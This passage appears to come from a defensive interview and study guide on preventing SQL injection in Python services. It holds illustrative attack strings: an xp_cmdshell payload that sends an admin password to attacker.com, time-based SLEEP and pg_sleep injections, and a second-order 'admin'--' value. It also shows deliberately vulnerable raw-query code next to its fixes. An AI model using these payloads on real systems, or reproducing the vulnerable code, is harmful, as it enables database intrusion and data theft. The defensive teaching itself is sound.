-- NOT GRANTED: access to information_schema (prevents schema enumeration)
-- NOT GRANTED: SUPERUSER, CREATEDB, CREATEROLE

-- Read-only replica user for reporting queries
CREATE USER reporting_user WITH PASSWORD '...';
GRANT SELECT ON TABLE transactions, accounts TO reporting_user;
-- Cannot modify data even if reporting endpoint is compromised

-- Separate user per service — loans service cannot access payments tables
CREATE USER loans_service WITH PASSWORD '...';
GRANT SELECT, INSERT ON TABLE loan_applications, credit_scores TO loans_service;
-- payments_service has separate credentials with access to payment_transactions only
```

If an attacker exploits SQLi in the `app_user` context, they can only read/write the tables explicitly granted — they cannot `DROP TABLE`, cannot read `information_schema`, cannot access tables belonging to other services.

**2. Database error message suppression:**
```python
# WRONG — exposes database internals to users
try:
    result = db.execute(query, params)
except Exception as e:
    return jsonify({"error": str(e)}), 500
# Attacker sees: ProgrammingError: relation "users" does not exist
#   → confirms table name guesses

# CORRECT — log internally, return generic message externally
import logging
logger = logging.getLogger(__name__)

try:
    result = db.execute(query, params)
except Exception as e:
    logger.error(
        "Database error",
        extra={"error": str(e), "query_id": query_id, "request_id": request_id}
    )
    return jsonify({"error": "An internal error occurred"}), 500
    # Attacker sees: "An internal error occurred" — no schema information
```

Suppressing error messages eliminates error-based SQLi entirely. The attacker must fall back to blind or time-based techniques, which are slower and noisier (more detectable).

**3. Stored procedures — encapsulating data access logic:**
```sql
-- PostgreSQL stored procedure — data access logic lives in the DB, not the application
CREATE OR REPLACE FUNCTION get_user_by_email(p_email TEXT)
RETURNS TABLE(id UUID, username TEXT, role TEXT)
LANGUAGE plpgsql
SECURITY DEFINER   -- runs with the procedure owner's privileges, not caller's
AS $$
BEGIN
    RETURN QUERY
    SELECT u.id, u.username, u.role
    FROM users u
    WHERE u.email = p_email   -- p_email is a parameter — no concatenation possible
      AND u.active = TRUE;
END;
$$;

-- Application calls the procedure — only the procedure name is dynamic, not its internals
cursor.execute("SELECT * FROM get_user_by_email(%s)", (email,))
```

Stored procedures called with parameters are as safe as parameterized queries — the SQL inside the procedure uses the parameter as data, not syntax. The benefit: the application cannot express arbitrary SQL — it can only call known procedures with known signatures. Even if the application layer is fully compromised, the attacker can only execute the operations the stored procedures expose.

**4. Network segmentation:**
```
Application servers  →  (allowed on port 5432)  →  Database
Attacker's exfiltration target  ←  (blocked by egress firewall)  ←  Database

Even if SQLi succeeds and the attacker tries:
'; EXEC xp_cmdshell 'curl http://attacker.com/?data=' + (SELECT password FROM users WHERE username='admin')--

The database server's outbound HTTP request is blocked by the egress firewall.
Out-of-band exfiltration (DNS, HTTP, SMB) is defeated by network controls.
The attacker must rely on in-band extraction — slower and more detectable.
```

**5. Input validation as a signal, not a control:**
```python
# Validate input types and ranges at the application layer
# This is not a SQLi defense (parameterized queries handle that)
# It is defense against malformed inputs and business logic errors

def get_transactions_by_user(user_id: str, limit: str, offset: str):
    # Type validation — raises before reaching the DB layer
    try:
        user_id = int(user_id)   # if this fails, user_id was not an integer
        limit   = min(int(limit), 100)   # cap at 100, never user-controlled unbounded
        offset  = max(int(offset), 0)    # no negative offsets
    except (ValueError, TypeError):
        raise HTTP400("Invalid parameter types")

    # Even if the type conversion succeeded, the values are now Python int objects
    # Not strings — they cannot contain SQL metacharacters
    cursor.execute(
        "SELECT * FROM transactions WHERE user_id = %s LIMIT %s OFFSET %s",
        (user_id, limit, offset)
    )
```

Type coercion before parameterization is defense-in-depth: even if the parameterization library had a bug, the input `"1 OR 1=1"` would fail `int()` conversion before reaching the SQL layer.

**Q14. What does a secure database access layer look like end-to-end in a Python microservice?**
A: A complete production pattern with all defenses layered:

```python
# db/repository.py — data access layer with full security controls

import hashlib, logging, time
from contextlib import contextmanager
from typing import Optional
from psycopg2.pool import ThreadedConnectionPool
from psycopg2.extras import RealDictCursor

logger = logging.getLogger(__name__)

# Allowlisted sort columns per query type — defined at module level, not runtime
TRANSACTION_SORT_COLS = frozenset({"created_at", "amount", "status", "merchant"})
TRANSACTION_SORT_DIRS = frozenset({"ASC", "DESC"})

class TransactionRepository:

    def __init__(self, pool: ThreadedConnectionPool):
        self._pool = pool

    @contextmanager
    def _cursor(self):
        conn = self._pool.getconn()
        try:
            with conn.cursor(cursor_factory=RealDictCursor) as cur:
                yield cur
            conn.commit()
        except Exception:
            conn.rollback()
            raise
        finally:
            self._pool.putconn(conn)

    def get_by_user(
        self,
        user_id: int,              # typed — not str, not Any
        limit: int,                # validated by caller before this method
        offset: int,
        sort_col: str = "created_at",
        sort_dir: str = "DESC",
        min_amount: Optional[float] = None,
    ) -> list[dict]:

        # Allowlist identifiers — these are the only dynamic SQL elements
        if sort_col not in TRANSACTION_SORT_COLS:
            raise ValueError(f"Invalid sort column: {sort_col!r}")
        if sort_dir.upper() not in TRANSACTION_SORT_DIRS:
            raise ValueError(f"Invalid sort direction: {sort_dir!r}")

        # Build query — only sort_col and sort_dir are interpolated (allowlisted above)
        # All values are parameterized
        params = [user_id]
        where_clauses = ["user_id = %s", "deleted_at IS NULL"]

        if min_amount is not None:
            where_clauses.append("amount >= %s")
            params.append(min_amount)

        where_sql = " AND ".join(where_clauses)
        query = f"""
            SELECT id, user_id, amount, currency, status, merchant, created_at
            FROM   financial_transactions
            WHERE  {where_sql}
            ORDER  BY {sort_col} {sort_dir.upper()}   -- allowlisted above
            LIMIT  %s OFFSET %s
        """
        params.extend([limit, offset])

        start = time.monotonic()
        try:
            with self._cursor() as cur:
                cur.execute(query, params)
                rows = cur.fetchall()

            logger.info(
                "transaction_query",
                extra={
                    "user_id":      user_id,
                    "row_count":    len(rows),
                    "duration_ms":  round((time.monotonic() - start) * 1000, 2),
                    "sort":         f"{sort_col} {sort_dir}",
                }
            )
            return [dict(row) for row in rows]

        except Exception as e:
            # Log full error internally — never expose to caller
            logger.error(
                "transaction_query_failed",
                extra={"user_id": user_id, "error": str(e)},
                exc_info=True,
            )
            raise DatabaseError("Query failed") from None  # strips DB details from exception

    def get_by_id(self, transaction_id: str, user_id: int) -> Optional[dict]:
        """Get a single transaction — always scope to user_id (prevents IDOR)."""
        with self._cursor() as cur:
            cur.execute(
                """SELECT id, user_id, amount, currency, status, merchant, created_at
                   FROM financial_transactions
                   WHERE id = %s AND user_id = %s AND deleted_at IS NULL""",
                (transaction_id, user_id)   # always both params — no IDOR via SQLi
            )
            row = cur.fetchone()
        return dict(row) if row else None

    def bulk_get_by_ids(self, transaction_ids: list[str], user_id: int) -> list[dict]:
        """Fetch multiple transactions — safe dynamic IN clause."""
        if not transaction_ids:
            return []
        if len(transaction_ids) > 500:
            raise ValueError("Batch size exceeds maximum of 500")

        with self._cursor() as cur:
            # PostgreSQL ANY — single parameter, no placeholder multiplication
            cur.execute(
                """SELECT id, amount, status, created_at
                   FROM financial_transactions
                   WHERE id = ANY(%s) AND user_id = %s AND deleted_at IS NULL""",
                (transaction_ids, user_id)
            )
            return [dict(row) for row in cur.fetchall()]
```

This pattern demonstrates the complete stack: typed inputs, allowlisted identifiers, all values parameterized, generic error messages externally, full context logged internally, user_id scoping on every query to prevent IDOR-via-SQLi, and the ANY(%s) pattern for dynamic IN clauses.

## Section 6: Scenario-Based Questions

**Q15. Scenario: "During a penetration test, you find a time-based blind SQL injection in your application's search endpoint. The endpoint uses an ORM. How is this possible, and how do you fix it?"**
A: A SQLi vulnerability in an ORM-based codebase almost always means someone used a raw query escape hatch without parameterization. The diagnosis steps:

```python
# Reported vulnerable endpoint: GET /api/products/search?q=laptop
# Tester confirmed: ?q=laptop'+AND+SLEEP(5)-- produces 5-second response

# Step 1: Find the search implementation
class ProductSearchView(APIView):
    def get(self, request):
        query    = request.query_params.get("q", "")
        category = request.query_params.get("category", "")

        # Bug found — Django ORM used safely for filtering,
        # but a raw() call was added for full-text search performance:
        products = Product.objects.raw(
            f"""
            SELECT p.*, ts_rank(search_vector, query) AS rank
            FROM products p, to_tsquery('english', '{query}') query
            WHERE search_vector @@ query
            """,
            # ← No params argument — query is interpolated directly
        )
        return Response(ProductSerializer(products, many=True).data)
```

The developer used Django ORM's `.raw()` for a PostgreSQL full-text search query and interpolated `query` directly into the SQL string. The ORM didn't protect them because they bypassed it.

Fix:

```python
# Fix 1: Use parameterized raw() — pass query as a parameter
products = Product.objects.raw(
    """
    SELECT p.*, ts_rank(search_vector, query) AS rank
    FROM products p, to_tsquery('english', %s) query
    WHERE search_vector @@ query
    AND active = TRUE
    ORDER BY rank DESC
    LIMIT 50
    """,
    [query]   # ← params argument — query is a parameter, not interpolated
)

# Fix 2: Use Django's SearchQuery (ORM-native full text search — no raw SQL needed)
from django.contrib.postgres.search import SearchQuery, SearchRank, SearchVector

search_query = SearchQuery(query)  # handles parameterization internally
products = (
    Product.objects
    .annotate(rank=SearchRank("search_vector", search_query))
    .filter(search_vector=search_query, active=True)
    .order_by("-rank")[:50]
)
# Generates fully parameterized SQL — no raw() needed
```

Accompanying fixes:
- Add Semgrep rule to CI to flag any `.raw()` call without a params argument — prevents recurrence.
- Audit all other `.raw()`, `.extra()`, and `cursor.execute()` calls in the codebase — if one endpoint had this pattern, others may too.
- Add the time-based blind injection test (`?q=' AND pg_sleep(5)--`) to the automated regression test suite so this specific vulnerability can never reappear undetected.

**Q16. Scenario: "A security engineer reports that an internal admin tool is vulnerable to second-order SQL injection. Explain how you would trace and fix it."**
A: Second-order SQLi requires tracing data from its storage point to all downstream queries that consume it. The approach:

```python
# Step 1: Identify the storage point
# Report says: admin can change their display_name, and it's used in admin queries later.

# Insertion — looks safe (parameterized)
def update_display_name(user_id: int, display_name: str):
    db.execute(
        "UPDATE users SET display_name = %s WHERE id = %s",
        (display_name, user_id)
    )
    # Stored in DB: display_name = "admin'--"  (literal string, correctly stored)

# Step 2: Find all reads of display_name
# Grep for anywhere display_name is retrieved and reused:
# grep -rn "display_name" --include="*.py"

# Bug found — audit log query built from retrieved display_name:
def log_admin_action(action: str, target_user_id: int, admin_user_id: int):
    # Retrieve admin's display_name from DB (trusted — it came from the database)
    admin = db.fetchone("SELECT display_name FROM users WHERE id = %s", (admin_user_id,))
    display_name = admin["display_name"]  # "admin'--"

    # BUG: retrieved value concatenated into a new query
    db.execute(
        f"INSERT INTO audit_log (action, target_id, actor_name) "
        f"VALUES ('{action}', {target_user_id}, '{display_name}')"
        # ^ display_name = "admin'--" → breaks out of the string literal
        # Injection fires HERE, not at storage
    )
```

Fix — parameterize every query, including those consuming data from the database:

```python
def log_admin_action(action: str, target_user_id: int, admin_user_id: int):
    admin = db.fetchone("SELECT display_name FROM users WHERE id = %s", (admin_user_id,))
    display_name = admin["display_name"]

    # FIX: parameterize — data from DB is still untrusted in a new query context
    db.execute(
        "INSERT INTO audit_log (action, target_id, actor_name) VALUES (%s, %s, %s)",
        (action, target_user_id, display_name)   # ← all three values are parameters
    )
    # "admin'--" is now bound as a string literal — cannot alter the query structure
```

The mental model to instill: **data from the database is not trusted SQL**. The database is a storage layer, not a sanitization layer. Any value retrieved from the database must be parameterized when used in a subsequent query, just as if it had come directly from user input. Second-order injection is the exploit that occurs when developers forget this rule.

## Quick Reference: SQLi Prevention Checklist

```
PARAMETERIZED QUERIES
[ ] Every SQL-executing call uses parameterized/prepared statements
[ ] Parameters are always passed as a separate argument (never formatted into the query string)
[ ] Dynamic identifiers (table names, column names, ORDER BY) are allowlisted before use
[ ] Dynamic IN clauses use placeholder multiplication or ANY(%s) — never string join of values

ORM USAGE
[ ] No .raw() / text() / sequelize.query() without params argument
[ ] No string interpolation (f-string, %, +) inside any ORM raw query call
[ ] .extra() (Django) is avoided — use .annotate() or .raw() with params
[ ] Sequelize.literal() used only for static, hardcoded SQL fragments
[ ] GORM .Where() always uses ? placeholders, never fmt.Sprintf
[ ] All raw SQL escape hatches are grep-audited in CI via Semgrep / Bandit / gosec

LEAST PRIVILEGE
[ ] Application DB user has no DDL privileges (DROP, CREATE, ALTER, TRUNCATE)
[ ] Application DB user cannot access information_schema
[ ] Per-service DB users with access only to their own tables
[ ] Read-only replica used for SELECT-only endpoints (reporting, analytics)

ERROR HANDLING
[ ] Database errors are caught and logged internally — never returned to the client
[ ] HTTP 500 responses contain only a generic message and a request ID
[ ] DB error messages are never written to response headers

DETECTION
[ ] SAST (Semgrep/Bandit/gosec) runs in CI with SQLi rules enabled
[ ] DAST (sqlmap or equivalent) runs in staging on each release
[ ] pgaudit / MySQL general log captures queries for anomaly detection
[ ] WAF with OWASP CRS deployed as defense-in-depth (not primary control)
[ ] Alert on: UNION in app_user queries, pg_sleep/SLEEP/WAITFOR in query logs
[ ] Penetration test includes SQLi in scope (automated + manual)
```
